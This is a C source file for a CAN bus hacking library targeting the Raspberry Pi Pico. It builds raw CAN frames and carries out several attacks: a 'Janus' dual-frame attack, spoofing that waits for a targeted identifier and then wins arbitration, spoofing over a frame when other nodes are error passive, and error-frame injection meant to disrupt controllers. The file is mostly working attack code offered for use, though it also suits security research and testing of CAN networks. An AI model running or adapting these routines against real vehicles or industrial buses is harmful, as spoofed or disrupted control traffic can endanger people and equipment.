// CAN hacking library. Targeted at the Raspberry Pi Pico board but should run on anything fast enough
// with a pair of I/O pins.
//
// The library
//
// The Janus Attack sets the bit pattern as follows:
//
// ^_____AAAAABBBBB^__...
// <--a-><-b->
// The first phase is to force a sync, the second phase is bit value A, the third phase is bit value B.
// The wrapper generates two bitstreams. The frame attack can be done provided the devices receiving
// the shorter frame cannot assert an SOF. This can be done by:
//
// 1. Ensuring there is no shorter frame (by mutating the payload until the number of stuff bits is the same)
// 2. Ensuring that traffic is not due yet from the devices that receive the shorter frame.
// 3. Ensuring that the devices that would generate traffic are in error passive mode.

#include "canhack.h"
#include <stdio.h>

struct canhack;

// This is the CAN frame bit pattern that will be transmitted after observing 11 idle bits
struct canhack {
    canhack_frame_t can_frame1;                 // CAN frame shared with API
    canhack_frame_t can_frame2;                 // CAN frame shared with API

    // Status
    bool sent;                                  // Indicates if frame sent or not

    struct {
        uint64_t bitstream_mask;
        uint64_t bitstream_match;
        uint32_t n_frame_match_bits;
        uint32_t n_frame_match_bits_cntdn;
        uint32_t attack_cntdn;
        uint32_t dominant_bit_cntdn;
    } attack_parameters;
};

struct canhack canhack;

// Returns true if should re-enter arbitration due to lost arbitration and/or error.
TIME_CRITICAL bool send_bits(ctr_t bit_end, ctr_t sample_point, struct canhack *canhack_p, uint8_t tx_index, uint32_t timeout, canhack_frame_t *frame)
{
    ctr_t now;
    uint32_t rx;
    uint8_t tx = frame->tx_bitstream[tx_index++];
    uint8_t cur_tx = tx;

    for (;;) {
        now = get_clock();
        // Bit end is scanned first because it needs to execute as close to the time as possible
        if (reached(now, bit_end)) {
            set_can_tx(tx);
            bit_end = advance(bit_end, BIT_TIME);

            // The next bit is set up after the time because the critical I/O operation has taken place now
            cur_tx = tx;
            tx = frame->tx_bitstream[tx_index++];

            if ((tx_index >= frame->tx_bits) || (--timeout == 0)) {
                // Finished
                set_can_tx_rec();
                canhack_p->sent = timeout > 0;
                return false;
            }
        }
        if (reached(now, sample_point)) {
            rx = get_can_rx();
            if (rx != cur_tx) {
                // If arbitration then lost, or an error, then give up and go back to SOF
                set_can_tx_rec();
                return true;
            }
            sample_point = advance(sample_point, BIT_TIME);
        }
    }
}

// Sends a sequence of bits, returns true if lost arbitration or an error
TIME_CRITICAL bool send_janus_bits(uint32_t bit_end, uint32_t sync_end, uint32_t split_end, uint32_t bit_time, struct canhack *canhack_p, uint8_t tx_index)
{
    ctr_t now;
    uint8_t rx;
    uint8_t tx1;
    uint8_t tx2;
    uint8_t tx_bits = canhack_p->can_frame1.tx_bits > canhack_p->can_frame2.tx_bits ? canhack_p->can_frame1.tx_bits : canhack_p->can_frame2.tx_bits;

    for (;;) {
        for (;;) {
            now = get_clock();
            // Bit end is scanned first because it needs to execute as close to the time as possible
            if (reached(now, bit_end)) {
                // Set a dominant state to force a sync (if previous sample was a 1) in all the CAN controllers
                set_can_tx_dom();
                // The next bit is set up after the time because the critical I/O operation has taken place now
                tx1 = canhack_p->can_frame1.tx_bitstream[tx_index];
                bit_end = advance(bit_end, bit_time);
                break;
            }
        }
        for (;;) {
            now = get_clock();
            if (reached(now, sync_end)) {
                set_can_tx(tx1);
                tx2 = canhack_p->can_frame2.tx_bitstream[tx_index];
                tx_index++;
                if (tx_index >= tx_bits) {
                    // Finished
                    set_can_tx_rec();
                    canhack_p->sent = true;
                    return false;
                }
                sync_end = advance(sync_end, bit_time);
                break;
            }
        }
        for (;;) {
            now = get_clock();
            if (reached(now, split_end)) {
                rx = get_can_rx();
                set_can_tx(tx2);
                split_end = advance(split_end, bit_time);
                if (rx != tx1) {
                    set_can_tx_rec();
                    return false;
                }
                break;
            }
        }
    }
}

TIME_CRITICAL void canhack_send_square_wave(void)
{
    reset_clock(0);
    ctr_t now = 0;
    ctr_t bit_end = BIT_TIME;
    uint8_t tx = 0;
    uint32_t timeout = 160U;

    for (;;) {
        now = get_clock();

        if (reached(now, bit_end)) {
            set_can_tx(tx);
            bit_end = advance(now, BIT_TIME);
            tx ^= 1U; // Toggle bit
            if (--timeout == 0) {
                set_can_tx_rec();
                return;
            }
        }
    }
}

TIME_CRITICAL void canhack_loopback(void)
{
    uint8_t rx = 0U;
    uint8_t prev_rx;

    for (;;) {
        // Wait for falling edge
        prev_rx = rx;
        rx = gpio_get(CAN_RX_PIN);
        if (prev_rx && !rx) {
            break;
        }
    }

    // Echo loopback for a number of bit times, starting with a falling edge
    // This should output on to the debug pin any incoming CAN frame
    uint i = 160U;
    ctr_t bit_end = BIT_TIME;
    reset_clock(0);
    while(i > 0) {
        set_debug(get_can_rx());
        ctr_t now = get_clock();
        if (reached(now, bit_end)) {
            bit_end = advance(now, BIT_TIME);
            i--;
        }
    }
    set_can_tx_rec();
}

// Sends frame 1, returns true if sent (false if a timeout or too many retries)
TIME_CRITICAL bool canhack_send_frame(uint32_t timeout, uint32_t retries)
{
    uint32_t prev_rx = 0;
    struct canhack *canhack_p = &canhack;
    uint32_t bitstream = 0;
    uint8_t tx_index;

    // Look for 11 recessive bits or 10 recessive bits and a dominant
    uint8_t rx;
    reset_clock(0);
    ctr_t now;
    ctr_t sample_point = SAMPLE_POINT_OFFSET;

SOF:
    for (;;) {
        rx = get_can_rx();
        now = get_clock();

        if (prev_rx && !rx) {
            reset_clock(0);
            sample_point = SAMPLE_POINT_OFFSET;
        }
        else if (reached(now, sample_point)) {
            ctr_t bit_end = sample_point + SAMPLE_TO_BIT_END;
            sample_point = advance(now, BIT_TIME);

            if (--timeout == 0) {
                set_can_tx_rec();
                return false;
            }
            bitstream = (bitstream << 1U) | rx;
            if ((bitstream & 0x7feU) == 0x7feU) {
                // 11 bits, either 10 recessive and dominant = SOF, or 11 recessive
                // If the last bit was recessive then start index at 0, else start it at 1 to skip SOF
                tx_index = rx ^ 1U;
                if (send_bits(bit_end, sample_point, canhack_p, tx_index, timeout, &canhack_p->can_frame1)) {
                    if (retries--) {
                        bitstream = 0; // Make sure we wait until EOF+IFS to trigger next attempt
                        goto SOF;
                    }
                    return false;
                }
                return canhack_p->sent;
            }
        }
        prev_rx = rx;
    }
}

// This sends a Janus frame, with sync_end being the relative time from the start of a bit when
// the value for the first bit value is asserted, and first_end is the time relative from the start
// of a bit when the second bit value is asserted.
TIME_CRITICAL bool canhack_send_janus_frame(uint32_t timeout, ctr_t sync_time, ctr_t split_time, uint32_t retries)
{
    uint32_t prev_rx = 0;
    struct canhack *canhack_p = &canhack;
    uint32_t bitstream = 0;
    uint8_t tx_index;

    // Look for 11 recessive bits or 10 recessive bits and a dominant
    uint8_t rx;
        ctr_t now = get_clock();
    ctr_t sample_point = now + SAMPLE_POINT_OFFSET;

SOF:
    for (;;) {
        rx = get_can_rx();
        now = get_clock();

        if (prev_rx && !rx) {
            reset_clock(0);
            sample_point = SAMPLE_POINT_OFFSET;
        }
        else if (reached(now, sample_point)) {
            if (--timeout == 0) {
                set_can_tx_rec();
                return false;
            }
            bitstream = (bitstream << 1U) | rx;
            uint32_t bit_end = sample_point + SAMPLE_TO_BIT_END;
            sample_point = advance(sample_point, BIT_TIME);
            if ((bitstream & 0x7feU) == 0x7feU) {
                sync_time = advance(sync_time, bit_end);
                split_time = advance(split_time, bit_end);
                // 11 bits, either 10 recessive and dominant = SOF, or 11 recessive
                // If the last bit was recessive then start index at 0, else start it at 1 to skip SOF
                tx_index = rx ^ 1U;
                if (send_janus_bits(bit_end, sync_time, split_time, BIT_TIME, canhack_p, tx_index)) {
                    if (retries--) {
                        bitstream = 0; // Make sure we wait until EOF+IFS to trigger next attempt
                        goto SOF;
                    }
                    return false;
                }
                else {
                    return canhack_p->sent;
                }
            }
        }
        prev_rx = rx;
    }
}

#ifdef NOTDEF
// Print 64-bit shift value; used for debugging/testing shift registers
static void print_uint64(uint64_t n)
{
    for (uint32_t i = 0; i < 64U; i++) {
        if (1ULL << (63U - i) & n) {
            printf("1");
        }
        else {
            printf("0");
        }
    }
    printf("\n");
}
#endif

// Wait for a targeted frame and then transmit the spoof frame after winning arbitration next
TIME_CRITICAL bool canhack_spoof_frame(uint32_t timeout, bool janus, ctr_t sync_time, ctr_t split_time, uint32_t retries)
{
    uint32_t prev_rx = 1U;
    struct canhack *canhack_p = &canhack;
    uint64_t bitstream = 0;
    uint64_t bitstream_mask = canhack_p->attack_parameters.bitstream_mask;
    uint64_t bitstream_match = canhack_p->attack_parameters.bitstream_match;

    uint8_t rx;
    reset_clock(0);
    ctr_t now;
    ctr_t sample_point = SAMPLE_POINT_OFFSET;

    for (;;) {
        rx = get_can_rx();
        now = get_clock();

        // This in effect is the bus integration phase of CAN
        if (prev_rx && !rx) {
            reset_clock(0);
            sample_point = SAMPLE_POINT_OFFSET;
        }
        else if (reached(now, sample_point)) {
            if (--timeout == 0) {
                set_can_tx_rec();
                return false;
            }
            sample_point = advance(sample_point, BIT_TIME);
            bitstream = (bitstream << 1U) | rx;
            // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
            if ((bitstream & bitstream_mask) == bitstream_match) {
                if (janus) {
                    return canhack_send_janus_frame(timeout, sync_time, split_time, retries);
                }
                else {
                    return canhack_send_frame(timeout, retries);
                }
            }
        }
        prev_rx = rx;
    }
 }

// Wait for a targeted frame and then transmit the spoof frame over the top of the targeted frame
TIME_CRITICAL bool canhack_spoof_frame_error_passive(uint32_t timeout)
{
    uint32_t prev_rx = 1U;
    struct canhack *canhack_p = &canhack;
    uint64_t bitstream = 0;
    uint64_t bitstream_mask = canhack_p->attack_parameters.bitstream_mask;
    uint64_t bitstream_match = canhack_p->attack_parameters.bitstream_match;

    uint8_t rx;
    reset_clock(0);
    ctr_t now;
    ctr_t sample_point = SAMPLE_POINT_OFFSET;

    for (;;) {
        rx = get_can_rx();
        now = get_clock();

        if (prev_rx && !rx) {
            reset_clock(0);
            sample_point = SAMPLE_POINT_OFFSET;
        }
        else if (reached(now, sample_point)) {
            if (--timeout == 0) {
                set_can_tx_rec();
                return false;
            }
            ctr_t bit_end = sample_point + SAMPLE_TO_BIT_END;
            sample_point = advance(sample_point, BIT_TIME);
            bitstream = (bitstream << 1U) | rx;
            // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
            if ((bitstream & bitstream_mask) == bitstream_match) {
                send_bits(bit_end, sample_point, canhack_p, canhack_p->attack_parameters.n_frame_match_bits, timeout, &canhack.can_frame1);
                return canhack_p->sent;
            }
        }
        prev_rx = rx;
    }
}

TIME_CRITICAL bool canhack_error_attack(uint32_t timeout, uint32_t repeat, bool inject_error, uint32_t eof_mask, uint32_t eof_match)
{
    uint32_t prev_rx = 1U;
    struct canhack *canhack_p = &canhack;
    uint64_t bitstream64 = 0;
    uint64_t bitstream64_mask = canhack_p->attack_parameters.bitstream_mask;
    uint64_t bitstream64_match = canhack_p->attack_parameters.bitstream_match;

    uint8_t rx;
    reset_clock(0);
    ctr_t now;
    ctr_t sample_point = SAMPLE_POINT_OFFSET;
    ctr_t bit_end;

    for (;;) {
        now = get_clock();
        rx = get_can_rx();
        if (prev_rx && !rx) {
            reset_clock(FALLING_EDGE_RECALIBRATE);
            sample_point = SAMPLE_POINT_OFFSET;
        }
        else if (reached(now, sample_point)) {
            bitstream64 = (bitstream64 << 1U) | rx;
            bit_end = sample_point + SAMPLE_TO_BIT_END;
            sample_point = advance(sample_point, BIT_TIME);
            // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
            if ((bitstream64 & bitstream64_mask) == bitstream64_match) {
                break;
                // Now want to inject an (optional) error frame
            }
            if (--timeout == 0) {
                return false;
            }
        }
        prev_rx = rx;
    }

    // bit_end is in the future, sample_point is after bit_end

    // Inject an error frame
    if (inject_error) {
        for (;;) {
            now = get_clock();
            if (reached(now, bit_end)) {
                set_can_tx_dom();
                break;
            }
        }
        bit_end = advance(bit_end, BIT_TIME * 6U);
        sample_point = advance(sample_point, BIT_TIME * 6U);
        for (;;) {
            now = get_clock();
            if (reached(now, bit_end)) {
                set_can_tx_rec();
                break;
            }
        }
    }

    // Now wait for error delimiter / IFS point to inject a bit one or more times
    uint32_t bitstream32 = 0;

    for (uint32_t i = 0; i < repeat; i++) {
        for (;;) {
            now = get_clock();
            rx = get_can_rx();
            if (prev_rx && !rx) {
                reset_clock(FALLING_EDGE_RECALIBRATE);
                sample_point = SAMPLE_POINT_OFFSET;
            }
            else if (reached(now, sample_point)) {
                bitstream32 = (bitstream32 << 1U) | rx;
                bit_end = sample_point + SAMPLE_TO_BIT_END;
                sample_point = advance(sample_point, BIT_TIME);
                if ((bitstream32 & eof_mask) == eof_match) {
                    // Inject six dominant bits to ensure an error frame is handled (in case all other devices are
                    // error passive and do not signal active error frames)
                    for (;;) {
                        now = get_clock();
                        if (reached(now, bit_end)) {
                            set_can_tx_dom();
                            bit_end = advance(bit_end, BIT_TIME * 7U);
                            sample_point = advance(sample_point, BIT_TIME * 7U);
                            bitstream32 = bitstream32 << 7U; // Pseudo-sample of own dominant bits
                            break;
                        }
                    }
                    for (;;) {
                        now = get_clock();
                        if (reached(now, bit_end)) {
                            set_can_tx_rec();
                            break;
                        }
                    }
                    break;
                }
            }
            prev_rx = rx;
        }
    }
    return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
// CAN frame creator.
//
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
static void add_raw_bit(uint8_t bit, bool stuff, canhack_frame_t *frame)
{
    // Record the status of the stuff bit for display purposes
    frame->stuff_bit[frame->tx_bits] = stuff;
    frame->tx_bitstream[frame->tx_bits++] = bit;
}

static void do_crc(uint8_t bitval, canhack_frame_t *frame)
{
    uint32_t bit_14 = (frame->crc_rg & (1U << 14U)) >> 14U;
    uint32_t crc_nxt = bitval ^ bit_14;
    frame->crc_rg <<= 1U;
    frame->crc_rg &= 0x7fffU;
    if (crc_nxt) {
        frame->crc_rg ^= 0x4599U;
    }
}

static void add_bit(uint8_t bit, canhack_frame_t *frame)
{
    if (frame->crcing) {
        do_crc(bit, frame);
    }
    add_raw_bit(bit, false, frame);
    if (bit) {
        frame->recessive_bits++;
        frame->dominant_bits = 0;
    } else {
        frame->dominant_bits++;
        frame->recessive_bits = 0;
    }
    if (frame->stuffing) {
        if (frame->dominant_bits >= 5U) {
            add_raw_bit(1U, true, frame);
            frame->dominant_bits = 0;
            frame->recessive_bits = 1U;
        }
        if (frame->recessive_bits >= 5U) {
            add_raw_bit(0, true, frame);
            frame->dominant_bits = 1U;
            frame->recessive_bits = 0;
        }
    }
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
// API to module
//
////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void canhack_set_frame(uint32_t id_a, uint32_t id_b, bool rtr, bool ide, uint32_t dlc, const uint8_t *data, canhack_frame_t *frame)
{
    uint8_t len = rtr ? 0 : (dlc >= 8U ? 8U : dlc); // RTR frames have a DLC of any value but no data field

    frame->tx_bits = 0;
    frame->crc_rg = 0;
    frame->stuffing = true;
    frame->crcing = true;
    frame->dominant_bits = 0;
    frame->recessive_bits = 0;

    for (uint32_t i = 0; i < CANHACK_MAX_BITS; i++) {
        frame->tx_bitstream[i] = 1U;
    }

    // ID field is:
    // {SOF, ID A, RTR, IDE = 0, r0} [Standard]
    // {SOF, ID A, SRR = 1, IDE = 1, ID B, RTR, r1, r0) [Extended]

    // SOF
    add_bit(0, frame);

    // ID A
    id_a <<= 21U;
    for (uint32_t i = 0; i < 11U; i++) {
        if (id_a & 0x80000000U) {
            add_bit(1U, frame);
        }
        else {
            add_bit(0, frame);
        }
        id_a <<= 1U;
    }

    // RTR/SRR
    if (rtr || ide) {
        add_bit(1U, frame);
    }
    else {
        add_bit(0, frame);
    }

    // The last bit of the arbitration field is the RTR bit if a basic frame; this might be overwritten if IDE = 1
    frame->last_arbitration_bit = frame->tx_bits - 1U;

    // IDE
    if (ide) {
        add_bit(1U, frame);
    }
    else {
        add_bit(0, frame);
    }

    if (ide) {
        // ID B
        id_b <<= 14U;
        for (uint32_t i = 0; i < 18U; i++) {
            if (id_b & 0x80000000U) {
                add_bit(1U, frame);
            } else {
                add_bit(0, frame);
            }
            id_b <<= 1U;
        }
        // RTR
        if (rtr) {
            add_bit(1U, frame);
        }
        else {
            add_bit(0, frame);
        }
        // The RTR bit is the last bit in the arbitration field if an extended frame
        frame->last_arbitration_bit = frame->tx_bits - 1U;

        // r1
        add_bit(0, frame);
    }
    else {
        // If IDE = 0 then the last arbitration field bit is the RTR
    }
    // r0
    add_bit(0, frame);

    // DLC
    dlc <<= 28U;
    for (uint32_t i = 0; i < 4U; i++) {
        if (dlc & 0x80000000U) {
            add_bit(1U, frame);
        } else {
            add_bit(0, frame);
        }
        dlc <<= 1U;
    }
    frame->last_dlc_bit = frame->tx_bits - 1U;

    // Data
    for (uint32_t i = 0; i < len; i ++) {
        uint8_t byte = data[i];
        for (uint32_t j = 0; j < 8; j++) {
            if (byte & 0x80U) {
                add_bit(1U, frame);
            }
            else {
                add_bit(0, frame);
            }
            byte <<= 1U;
        }
    }
    // If the length is 0 then the last data bit is equal to the last DLC bit
    frame->last_data_bit = frame->tx_bits - 1U;

    // CRC
    frame->crcing = false;
    uint32_t crc_rg = frame->crc_rg << 17U;
    for (uint32_t i = 0; i < 15U; i++) {
        if (crc_rg & 0x80000000U) {
            add_bit(1U, frame);
        } else {
            add_bit(0, frame);
        }
        crc_rg <<= 1U;
    }
    frame->last_crc_bit = frame->tx_bits - 1U;

    // Bit stuffing is disabled at the end of the CRC field
    frame->stuffing = false;

    // CRC delimiter
    add_bit(1U, frame);

    // ACK; we transmit this as a dominant bit to ensure the state machines lock on to the right
    // EOF field; it's mostly moot since if there are no CAN controllers then there is not much
    // hacking to do.
    add_bit(0, frame);

    // ACK delimiter
    add_bit(1U, frame);

    // EOF
    add_bit(1U, frame);
    add_bit(1U, frame);
    add_bit(1U, frame);
    add_bit(1U, frame);
    add_bit(1U, frame);
    add_bit(1U, frame);
    add_bit(1U, frame);
    frame->last_eof_bit = frame->tx_bits - 1U;

    // IFS
    add_bit(1U, frame);
    add_bit(1U, frame);
    add_bit(1U, frame);

    // Set up the matching masks for this CAN frame
    frame->tx_arbitration_bits = frame->last_arbitration_bit + 1U;

    frame->frame_set = true;
}

canhack_frame_t *canhack_get_frame(bool second)
{
    return second ? &canhack.can_frame2 : &canhack.can_frame1;
}

// Sets the CAN hack masks from frame 1 (frame 2 is only used in the Janus attack)
void canhack_set_attack_masks(void)
{
    canhack.attack_parameters.n_frame_match_bits = canhack.can_frame1.last_arbitration_bit + 1U;
    canhack.attack_parameters.bitstream_mask = (1ULL << (canhack.attack_parameters.n_frame_match_bits + 10U)) - 1ULL;
    canhack.attack_parameters.bitstream_match = 0x3ffULL;
    for (uint32_t i = 0; i < canhack.attack_parameters.n_frame_match_bits; i++) {
        canhack.attack_parameters.bitstream_match <<= 1U; // Shift a 0 in
        canhack.attack_parameters.bitstream_match |= canhack.can_frame1.tx_bitstream[i]; // OR in the bit (first bit is SOF)
    }
}

void canhack_init(void)
{
    canhack.can_frame1.frame_set = false;
    canhack.can_frame2.frame_set = false;
}
